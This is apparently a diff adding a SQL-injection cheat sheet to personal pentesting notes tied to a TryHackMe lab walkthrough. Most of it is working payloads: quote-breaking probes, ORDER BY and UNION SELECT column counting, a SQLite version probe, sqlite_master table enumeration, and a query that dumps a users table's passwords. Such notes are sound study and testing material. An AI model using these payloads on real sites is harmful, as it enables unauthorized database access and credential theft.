@@ -74,7 +74,100 @@ ls /SecLists/Discovery/Web-Content/common.txt
 
 <figure><img src="../../.gitbook/assets/image (35) (1).png" alt=""><figcaption></figcaption></figure>
 
+## Find amount of fields
 
+**Examples**
+
+[madeyes-castle](../../walkthroughs/tryhackme/madeyes-castle/ "mention")
+
+**Example List**
+
+```
+'
+"
+`
+')
+")
+`)
+'))
+"))
+`))
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+1' ORDER BY 4--+
+1' GROUP BY 1--+
+1' GROUP BY 2--+
+1' GROUP BY 3--+
+1' GROUP BY 4--+
+1' UNION SELECT null-- -
+1' UNION SELECT null,null-- -
+1' UNION SELECT null,null,null-- -
+1' UNION SELECT null,null,null,null-- -
+1' UNION SELECT null,null,null,null,null-- -
+```
+
+<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+###
+
+<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+## Find SQL Version
+
+**Examples**
+
+[madeyes-castle](../../walkthroughs/tryhackme/madeyes-castle/ "mention")
+
+```
+1'%20UNION%20SELECT%20null,null,null,sqlite_version()--%20-&password='
+```
+
+<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+**Burp**
+
+```
+1'%20UNION%20SELECT%20sqlite_version(),null,null,sqlite_version()--%20-&password='
+```
+
+## Find Tables
+
+**Examples**
+
+[madeyes-castle](../../walkthroughs/tryhackme/madeyes-castle/ "mention")
+
+```
+' union select group_concat(tbl_name),2,3,4  FROM sqlite_master  WHERE type='table' and tbl_name NOT like 'sqlite_%'-- -
+```
+
+<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+## Get fields
+
+**Examples**
+
+[madeyes-castle](../../walkthroughs/tryhackme/madeyes-castle/ "mention")
+
+**Burp**
+
+```
+' union select group_concat(tbl_name),2,3,4  FROM sqlite_master  WHERE type='table' and tbl_name NOT like 'sqlite_%'-- -
+```
+
+<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+## Get field info
+
+**Examples**
+
+[madeyes-castle](../../walkthroughs/tryhackme/madeyes-castle/ "mention")
+
+```
+' union select group_concat(password),2,3,4  FROM users -- -
+```
+
+<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### SQLMap
 
